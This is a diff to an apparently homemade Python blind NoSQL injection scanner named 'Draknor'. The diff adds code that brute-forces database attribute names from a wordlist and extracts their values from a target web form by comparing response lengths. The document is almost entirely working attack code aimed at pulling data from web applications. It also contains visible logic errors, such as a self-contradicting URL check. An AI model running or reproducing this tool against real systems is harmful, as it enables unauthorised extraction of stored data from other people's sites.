@@ -5,7 +5,8 @@ from utils import *
 
 #TODO
 # implement custom fail string implementation
-# 
+# implement array payload handling
+# implement time based payload handling
                     
 
 def scan_array_payloads():
@@ -27,11 +28,11 @@ def scan_bool_payloads(url, form_data,scan_param_name, default_response):
 
         #is request error
         if response.status_code != default_response.status_code:
-            print(f"[?] Unexpected Status Code: {response.status_code} {payload}")       
+            print(f"\t[?] Unexpected Status Code: {response.status_code} {payload}")       
             error_payloads.append([response.status_code, response, [payload, extraction_payload]])
         # is request success
         elif len(response.text) != len(default_response.text):            
-            print(f"[+] SUCCESS:{payload}")       
+            print(f"\t[+] SUCCESS:{payload}")       
             success_payloads.append([payload, extraction_payload])     
 
     return success_payloads, error_payloads
@@ -55,6 +56,13 @@ def main():
     scan_param_name=args.parameter
     fail_message=args.fail_string
 
+    with open("attributes.txt") as file:
+        attributes_list = set(l.strip() for l in file.readlines())
+    if not attributes_list:
+        print("Attributes list attributes.txt could not be found")
+        exit()
+
+    print("--- Starting Draknor NoSQL Injection Scanner ---")
     # extract post data from html form
     form_target=args.target
     if not form_target.startswith("http://") or form_target.startswith("http://"):
@@ -64,16 +72,15 @@ def main():
     # prepare attack target url
     parsed_url = urlparse(form_target)
     url = f"{parsed_url.scheme}://{parsed_url.netloc}"+form_data["action"]    
-    print(form_data)
-
-
+    print("[+] Extracted form:", form_data)
+    print("[*] Checking if form target page is dynamic...")
     # get default response for random payload
     default_response = get_random_payload_response(form_data, scan_param_name, url)
     # check if page is dynamic
     default_response_2 = get_random_payload_response(form_data, scan_param_name, url)
 
     if len(default_response.text) == len(default_response_2.text):
-        print("[+] Page content is not dynamic")
+        print("[+] Form target page is not dynamic")
     else:
         print("[-] Page content is dynamic")
         print("[-] You need to specify a fail or success string.")
@@ -82,25 +89,44 @@ def main():
     # Start Scanning
     success_payloads, error_payloads = scan_bool_payloads(url,form_data,scan_param_name, default_response)
 
-    # display results
+    # display results    
     print("Successfull payloads:")
     for p in success_payloads:
         print(p)
+        
     print("Error inflicting payloads:")
     for p in error_payloads:
         print(p)
         
-    for payload, extraction_payload in success_payloads:
-        # validate insertion point with request param as extraction attribute
-        extraction_attribute_length = get_extraction_parameter_length(url, form_data,scan_param_name, default_response, extraction_payload, scan_param_name)
-        if extraction_attribute_length:
+
+    for _, extraction_payload in success_payloads:     
+        found_attributes = brute_attribute_names(url, form_data,scan_param_name, default_response, extraction_payload, attributes_list)
+        if found_attributes:
             extraction_point = extraction_payload
             break
+
+    results = []
+    for attr in found_attributes:
+        extraction_attribute_length = get_extraction_parameter_length(url, form_data,scan_param_name, default_response, extraction_payload, extraction_attribute_name=attr)
+        if extraction_attribute_length:
+            print(f"\t[+] attr.length: {extraction_attribute_length}")
+            res = brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, attr, extraction_attribute_length)
+            if res:
+                print(f"\t[data] {attr}: {res}")   
+                results.append([attr, res])
+        else: print(f"[-] Could not get length of {attr}")
     
-    brute_extract_data(url, form_data,scan_param_name, default_response, extraction_point, "username", extraction_attribute_length)
-    #send_extraction_request(url, form_data, extraction_point, extraction_payload, insertion_param_name, default_response)
+    print("Extracted attributes:")
+    print(", ".join(found_attributes))
+
+    print("Extracted data:")
+    for r in results:
+        print(f"[+] {r[0]}:{r[1]}")
+
     #if args.arrays:  
     #    scan_array_payloads()
 
-
-main()
+try:
+    main()
+except KeyboardInterrupt:
+    print("\nCTRL+C detected! Draknor shuting down...")
